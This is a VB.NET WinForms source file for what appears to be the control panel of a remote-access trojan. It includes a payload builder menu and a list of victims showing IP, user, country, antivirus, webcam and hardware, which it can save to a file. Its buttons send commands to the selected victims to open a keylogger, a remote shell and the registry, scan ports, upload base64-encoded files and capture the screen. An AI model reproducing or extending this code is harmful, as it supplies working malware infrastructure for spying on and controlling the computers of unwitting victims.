Imports System.IO
Imports System.Runtime.InteropServices

Public Class Form11

    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Sub Form11_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        MenuStrip1.Renderer = New clsVistaToolStripRenderer
        Form1.PictureBox2.Hide()
        Dim d As String
        d = System.Environment.UserName
        Text = "User " + d + ""
        IsMdiContainer = True
        Form1.MdiParent = Me
        Form1.Show()
        Form1.WindowState = FormWindowState.Maximized





    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click


        Form3.ShowDialog()

    End Sub

    Private Sub XOPToolStripMenuItem_Click(sender As Object, e As EventArgs)



    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form10.Show()

        Next
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "\\") ' 
            Form1.colord()
        Next
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "OpenPro")
            Form1.colord()
        Next
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "TETE")
            Form1.colord()
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        For i = 1 To 2
            VisualStudioSeperator1.Left = VisualStudioSeperator1.Left - 1


            If VisualStudioSeperator1.Right < Panel1.Left Then
                VisualStudioSeperator1.Left = Panel1.Right




            End If



        Next


    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "openkl")
            Form1.colord()
        Next
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "openshell")
            Form1.colord()
        Next
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Try

            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "openRG" & "|U|")
                Form1.colord()
            Next
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "cc")
            Form1.colord()
        Next
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Try
            If Form1.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then



                Dim folders = (Application.StartupPath & "/bookbinder/" & (Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(0).Text) + "\" + "tas.txt")
                If File.Exists(folders) Then
                Else

                    My.Computer.FileSystem.WriteAllText(folders, "", False)
                End If
                Form20.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Try
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "chat")
                Form1.colord()
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Try
            If Form1.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form13.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Timer1.Start()
            Form1.S.Send(x.ToolTipText, "sendinformation")
            Form1.colord()
        Next
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "sendfile" & "|U|" & n.Name & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Form1.colord()
            Next
        Else

        End If
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        Try
            If Form1.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form17.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "fun")
            Form1.colord()
        Next
    End Sub





    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "ports")
            Form1.colord()
        Next
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form22.Show()

        Next
    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            On Error Resume Next
            Dim o As New OpenFileDialog
            o.ShowDialog()
            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then

                Form1.S.Send(x.ToolTipText, "sendfileimge" & "|U|" & n.Name & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Form1.colord()
            End If
        Next
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form23.Show()

        Next
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form24.Show()

        Next
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        Try
            If Form1.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Form15.Show()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub WToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        Form4.ShowDialog()
    End Sub

    Private Sub SeveNameServerInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SeveNameServerInformationToolStripMenuItem.Click
        Dim o As New SaveFileDialog
        o.Filter = "Txt|*.Txt"

        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each ll As ListViewItem In Form1.L1.Items
                My.Computer.FileSystem.WriteAllText(o.FileName, "Server ID : " & ll.SubItems(0).Text & vbNewLine + " IP : " & ll.SubItems(1).Text & vbNewLine + " PC / User  : " & ll.SubItems(2).Text & vbNewLine + " Country  : " & ll.SubItems(3).Text & vbNewLine + " OS  : " & ll.SubItems(4).Text & vbNewLine + " Anti Virus  : " & ll.SubItems(5).Text & vbNewLine + " Acitve Windows  : " & ll.SubItems(6).Text & vbNewLine + " CAM  : " & ll.SubItems(7).Text & vbNewLine + " RAM  : " & ll.SubItems(8).Text & vbNewLine + " CPU  : " & ll.SubItems(9).Text & vbNewLine + " Ver  : " & ll.SubItems(10).Text & vbNewLine + " Install Date  : " & ll.SubItems(11).Text & vbNewLine + " company  : " & ll.SubItems(12).Text & vbNewLine + " Internal IP  : " & ll.SubItems(13).Text & vbNewLine + "------------END", True)
            Next
            MsgBox("OK")
        End If
    End Sub

    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub RememberTheThumbnailToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RememberTheThumbnailToolStripMenuItem.Click
        Dim s As New SaveFileDialog
        s.Filter = "Screen capture|*.png"
        If s.ShowDialog = Windows.Forms.DialogResult.OK Then
            Form1.PictureBox1.Image.Save(s.FileName)
        End If
    End Sub
    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "++")
            Form1.colord()
        Next
    End Sub

    Private Sub ShowServerInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowServerInformationToolStripMenuItem.Click
        Form1.SplitContainer2.Panel2Collapsed = False
        RememberTheThumbnailToolStripMenuItem.Enabled = True
        Form1.CheckBox2.Checked = True
        Dim folders = ("show.ini")
        My.Computer.FileSystem.WriteAllText(folders, "Hardware information = S", False)
        File.Delete("Hide.ini")


    End Sub

    Private Sub HideInformationServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideInformationServerToolStripMenuItem.Click
        Form1.SplitContainer2.Panel2Collapsed = True
        RememberTheThumbnailToolStripMenuItem.Enabled = False
        Form1.CheckBox2.Checked = False
        Dim folders = ("Hide.ini")
        My.Computer.FileSystem.WriteAllText(folders, "Hardware information = H", False)
        File.Delete("show.ini")
    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "ssopen")
            Form1.colord()
        Next
    End Sub



    Private Sub Q1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q1ToolStripMenuItem.Click
        Form1.L1.View = Windows.Forms.View.Details
    End Sub

    Private Sub Q2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q2ToolStripMenuItem.Click
        Form1.L1.View = Windows.Forms.View.LargeIcon
    End Sub

    Private Sub Q3ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q3ToolStripMenuItem.Click
        Form1.L1.View = Windows.Forms.View.List
    End Sub

    Private Sub Q4ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q4ToolStripMenuItem.Click
        Form1.L1.View = Windows.Forms.View.SmallIcon
    End Sub

    Private Sub SToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SToolStripMenuItem.Click


        Dim folders = ("OGPo.igo")
        My.Computer.FileSystem.WriteAllText(folders, "------{0} = S", False)
        File.Delete("OGP.igo")


    End Sub

    Private Sub DToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DToolStripMenuItem.Click


        Dim folders = ("OGP.igo")
        My.Computer.FileSystem.WriteAllText(folders, "------{0} = H", False)
        File.Delete("OGPo.igo")

    End Sub
End Class